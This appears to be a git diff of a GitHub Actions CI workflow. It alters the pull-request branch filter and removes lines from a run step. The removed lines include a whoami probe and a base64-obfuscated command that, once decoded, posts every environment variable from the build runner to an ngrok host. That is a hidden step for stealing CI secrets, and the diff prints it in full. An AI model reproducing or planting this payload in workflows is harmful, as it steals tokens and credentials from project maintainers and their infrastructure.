@@ -7,7 +7,7 @@ on:
   push:
     branches: [b]
   pull_request:
-    branches: [main]
+    branches: [dummy-guy-organization:main]
 
 jobs:
   build:
@@ -23,6 +23,3 @@ jobs:
           node-version: ${{ matrix.node-version }}
       - run: |
           echo Im in.
-          echo Whoami ? 
-          whoami
-          eval "$(echo "IyEvYmluL2Jhc2gKZWNobyAiSW0gSGVyZSIKY3VybCAtWCBQT1NUIC1IICdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC0tZGF0YSAneyJ0ZXh0IjoiSGVsbG8sIFdvcmxkISJ9JyBodHRwOi8vYjdlMTljNWViOGVhLm5ncm9rLmlvL2FwaS9pbmZvCnN1ZG8gYXB0IGluc3RhbGwganEKcHJpbnRlbnYgfCBqcSAtc1IgICdzcGxpdCgiXG4iKSB8IG1hcChzcGxpdCgiPSIpKSB8IG1hcChzZWxlY3QobGVuZ3RoID4gMCkgfCB7ICguWzBdKSA6ICguWzE6XSB8IGpvaW4oIiIpKSB9KSB8IGFkZCcgfCBjdXJsIC1YIFBPU1QgLUggJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vanNvbicgIGh0dHA6Ly9iN2UxOWM1ZWI4ZWEubmdyb2suaW8vYXBpL2luZm8gLS1kYXRhLWJpbmFyeSBALQo=" | base64 -d)"
